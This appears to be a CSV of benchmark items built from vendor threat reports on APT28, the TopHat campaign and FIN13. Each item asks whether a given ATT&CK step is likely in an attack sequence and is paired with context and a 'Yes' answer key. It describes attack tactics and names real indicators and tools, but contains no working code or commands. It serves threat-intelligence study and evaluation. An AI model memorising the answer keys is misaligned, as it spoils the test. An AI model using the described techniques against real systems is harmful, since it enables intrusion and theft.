Question ID,AttackSeq ID,Batch ID,Question,Key Points,Context,Ground Truth,Source
1868,335,335-Persistence-T1547-Boot or Logon Autostart Execution,"After APT28's malicious document leverages the Dynamic Data Exchange (DDE) technique via PowerShell to achieve execution by downloading and running encoded commands, is it likely to observe the document creating a batch file and a registry entry to ensure persistence of the malware on the victim's system?",Persistence: The document creates a batch file and a registry entry to ensure persistence of the malware on the victim's system.,"Initial Access: During our monitoring of activities around the APT28 threat group, McAfee Advanced Threat Research analysts identified a malicious Word document that appears to leverage the Microsoft Office Dynamic Data Exchange (DDE) technique that has been previously reported by Advanced Threat Research. This document likely marks the first observed use of this technique by APT28. The use of DDE with PowerShell allows an attacker to execute arbitrary code on a victim's system regardless whether macros are enabled.
Execution: The document uses the recently detailed DDE technique found in Office products to invoke the command prompt to invoke PowerShell, which runs two commands. The first command is a PowerShell script that downloads a string from a URL, which is then executed as an encoded command. The second PowerShell command is Base64 encoded and is found in the version of config.txt received from the remote server. It downloads a file from a URL and creates a batch file and a registry entry to ensure persistence.
Defense Evasion: APT28 is known for rapidly incorporating new exploitation techniques to increase its success, such as moving away from using VBA scripts employed in past actions and choosing to incorporate the DDE technique to bypass network defenses.
Command and Control: Once opened, the document contacts a control server to drop the first stage of the malware, Seduploader, onto a victim's system. The control server domain associated with this activity is webviewres[.]net, which is consistent with past APT28 domain registration techniques that spoof legitimate-sounding infrastructure.
Others: APT28 has recently focused on using different themes. In this case, it capitalized on the recent terrorist attack in New York City. The document itself is blank. The domain involved in the distribution of Seduploader was created on October 19, 11 days prior to the creation of Seduploader. The document downloads a version of the Seduploader first-stage reconnaissance implant, which profiles prospective victims, pulling basic host information from the infected system to the attackers. If the system is of interest, then the installation of X-Agent or Sedreco usually follows. We have observed APT28 using Seduploader as a first-stage payload for several years from various public reporting. Based on structural code analysis of recent payloads observed in the campaign, we see they are identical to previous Seduploader samples employed by APT28. The domain satellitedeluxpanorama[.]com, used by the implant secnt.dll, resolved to 89.34.111.160 as of November 5. The malicious document 68c2809560c7623d2307d8797691abf3eafe319a is responsible for dropping the Seduploader payload (secnt.dll). Its original file name was SaberGuardian2017.docx. This document was created on October 27. The document is distributed from hxxp://sendmevideo[.]org/SaberGuardian2017.docx. The document calls sendmevideo[.]org/dh2025e/eh.dll to download Seduploader(ab354807e687993fbeb1b325eb6e4ab38d428a1e). The file vms.dll, 4bc722a9b0492a50bd86a1341f02c74c0d773db7, is 99% similar-to secnt.dll ab354807e687993fbeb1b325eb6e4ab38d428a1e, indicating the code is almost identical and highly likely to be part of the same campaign. These two DLL implants are likely part of the same campaign. Furthermore, the sample 4bc722a9b0492a50bd86a1341f02c74c0d773db7, based on our code analysis, is 99% similar to the DLL implant 8a68f26d01372114f660e32ac4c9117e5d0577f1, which was used in a campaign spoofing the upcoming cyber conference Cy Con U.S. The attack techniques in the two campaigns differ: The campaign spoofing the Cy Con U.S conference used document files to execute a malicious VBA script; this campaign using the terrorist theme uses DDE within a document file to execute PowerShell and fetches a remote payload from a distribution site. The payloads, however, are identical for both campaigns.",Yes,Threat_Group_APT28_Slips_Office_Malware
1869,336,336-Initial Access-T1566-Phishing,"After the Scote malware provides backdoor access by collecting C2 information from Pastebin links and Google+ profiles, is it likely that the attackers used Arabic language decoy documents to entice victims as part of their phishing strategy during the initial access phase?","Initial Access: In the TopHat campaign, attackers used Arabic language decoy documents related to current events within the Palestine Territories to entice victims. The attacks were deployed via malicious RTF files, self-extracting Windows executables, and RAR archives. The RTF files made HTTP requests to a bit.ly URL, which redirected to a malicious site. The self-extracting executables loaded a decoy document and spawned an instance of Scote malware.","Execution: The Scote malware family, once executed, provides backdoor access for an attacker. It collects command and control (C2) information from Pastebin links and Google+ profiles. The bit.ly links obscured the C2 URLs, preventing victims from evaluating the legitimacy of the final site.
Defense Evasion: Scote malware employs various techniques to evade detection, including the use of legitimate third-party online services to host its C2 information. The malware uses a series of techniques and tricks when loaded onto a victim machine, including layers of obfuscation.
Command and Control: Scote malware retrieves C2 information from Pastebin postings or Google+ accounts. It uses this information to communicate with C2 servers and can accept commands to kill the malware, run 'ipconfig', run 'cmd.exe /C systeminfo', and load a DLL from a C2.
Others: The TopHat campaign overlaps with the previously reported DustySky campaign. The attacker tested their malware against multiple security products and submitted files that appear to be new variants of the DustySky Core malware. The campaign leveraged political events to target individuals or organizations within the Palestine region. Palo Alto Networks customers are protected by this threat through tagging in AutoFocus, flagging of malicious domains, marking samples as malicious within WildFire, and blocking exploits used by the RTF files. Google, Pastebin, and bit.ly have been notified of the malicious content hosted on their services.",Yes,unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services
1870,336,336-Command and Control-T1102-Web Service,"After Scote malware employs various techniques to evade detection using legitimate third-party online services to host its C2 information, is it likely that it retrieves C2 information from Pastebin postings or Google+ accounts before communicating with C2 servers to accept commands?","Command and Control: Scote malware retrieves C2 information from Pastebin postings or Google+ accounts. It uses this information to communicate with C2 servers and can accept commands to kill the malware, run 'ipconfig', run 'cmd.exe /C systeminfo', and load a DLL from a C2.","Initial Access: In the TopHat campaign, attackers used Arabic language decoy documents related to current events within the Palestine Territories to entice victims. The attacks were deployed via malicious RTF files, self-extracting Windows executables, and RAR archives. The RTF files made HTTP requests to a bit.ly URL, which redirected to a malicious site. The self-extracting executables loaded a decoy document and spawned an instance of Scote malware.
Execution: The Scote malware family, once executed, provides backdoor access for an attacker. It collects command and control (C2) information from Pastebin links and Google+ profiles. The bit.ly links obscured the C2 URLs, preventing victims from evaluating the legitimacy of the final site.
Defense Evasion: Scote malware employs various techniques to evade detection, including the use of legitimate third-party online services to host its C2 information. The malware uses a series of techniques and tricks when loaded onto a victim machine, including layers of obfuscation.
Others: The TopHat campaign overlaps with the previously reported DustySky campaign. The attacker tested their malware against multiple security products and submitted files that appear to be new variants of the DustySky Core malware. The campaign leveraged political events to target individuals or organizations within the Palestine region. Palo Alto Networks customers are protected by this threat through tagging in AutoFocus, flagging of malicious domains, marking samples as malicious within WildFire, and blocking exploits used by the RTF files. Google, Pastebin, and bit.ly have been notified of the malicious content hosted on their services.",Yes,unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services
1872,337,337-Reconnaissance-T1590-Gather Victim Network Information,"After FIN13 has exploited external servers to deploy web shells and custom malware like BLUEAGAVE and SIXPACK for Initial Access, is it likely that Mandiant will track FIN13 as a threat actor involved in gathering victim network information during the Reconnaissance phase before the group employs JSPRAT for local command execution and network traffic proxying during Execution?","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.","Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1875,337,337-Initial Access-T1190-Exploit Public-Facing Application,"After FIN13 uses utilities such as ProcDump to dump LSASS process memory and executes passive backdoors like BLUEAGAVE for command execution, is it likely FIN13 exploits external servers and deploys web shells to establish initial access into victim networks?","Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1877,337,337-Persistence-T1554-Compromise Client Software Binary,"After employing JSPRAT for local command execution and leveraging BLUEAGAVE for HTTP-based command execution, is FIN13 likely to replace KeePass binaries with trojanized versions to ensure persistence before using tools like Mimikatz and ProcDump to escalate privileges?","Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1878,337,337-Credential Access-T1003-OS Credential Dumping,Is it likely that FIN13 will gather information on network and host configurations using native OS binaries for reconnaissance before dumping LSASS process memory to obtain credentials for their operations?,Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.,"Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1879,337,337-Credential Access-T1040-Network Sniffing,"After using trojanized KeePass binaries to log newly entered passwords during privilege escalation, is FIN13 likely to employ network sniffing to obtain credentials before leveraging native OS binaries and custom malware to gather network and host configuration details for internal reconnaissance?",Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.,"Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1881,337,337-Lateral Movement-T1021-Remote Services,"After leveraging native OS binaries and custom malware for internal reconnaissance during discovery, is it likely that FIN13 will use tools like Invoke-WMIExec and custom web shells such as BUSTEDPIPE for lateral movement via remote services before collecting data from network shared drives and targeting specific information for fraudulent transactions?","Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1882,337,337-Command and Control-T1090-Proxy,"After collecting sensitive data from network shared drives and archiving it locally or remotely using utilities and libraries, is FIN13 likely to use proxies for communication and command and control before exfiltrating the data over web services with tools like web shells and JSP tools?","Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
